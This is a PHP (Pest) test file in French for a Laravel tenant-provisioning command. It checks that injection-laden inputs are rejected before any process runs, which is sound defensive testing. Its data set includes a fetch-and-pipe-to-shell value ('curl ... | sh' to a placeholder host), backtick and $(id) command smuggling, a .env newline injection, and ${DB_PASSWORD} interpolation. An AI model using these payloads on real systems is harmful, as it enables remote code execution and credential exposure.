<?php

use App\Models\Tenant;
use Illuminate\Support\Facades\Process;

beforeEach(fn () => Process::fake());

function provisionner(array $options)
{
    return test()->artisan('tenant:provision', array_merge([
        '--code' => 'lycee-yop',
        '--name' => 'Lycée de Yopougon',
        '--subdomain' => 'lycee-yop',
        '--branch' => 'presentation',
        '--plan' => 'free',
        '--admin-email' => 'admin@example.ci',
        '--admin-name' => 'Admin',
        '--timezone' => 'UTC',
    ], $options));
}

it('refuse un identifiant piégé avant toute écriture et tout processus', function (array $options) {
    provisionner($options)->assertExitCode(1);

    Process::assertNothingRan();
    expect(Tenant::count())->toBe(0);
})->with([
    'code avec commande'       => [['--code' => 'x;curl https://x.example/p|sh']],
    'code avec backtick'       => [['--code' => 'a`id`']],
    'code en majuscules'       => [['--code' => 'Lycee']],
    'code à tiret initial'     => [['--code' => '-oops']],
    'code trop long pour MySQL' => [['--code' => str_repeat('a', 55)]],
    'sous-domaine avec point'  => [['--subdomain' => 'a.evil']],
    'sous-domaine avec $( )'   => [['--subdomain' => '$(id)']],
    'branche piégée'           => [['--branch' => 'main;id']],
    'nom qui injecte le .env'  => [['--name' => "Ecole\"\nAPP_DEBUG=true"]],
    'nom avec interpolation'   => [['--name' => 'Ecole ${DB_PASSWORD}']],
]);

it('laisse passer des identifiants ordinaires jusqu\'à la confirmation', function () {
    provisionner(['--name' => 'École Sainte-Marie d’Abidjan'])
        ->expectsConfirmation('Confirmer le provisionnement ?', 'no')
        ->assertExitCode(0);

    Process::assertNothingRan();
});
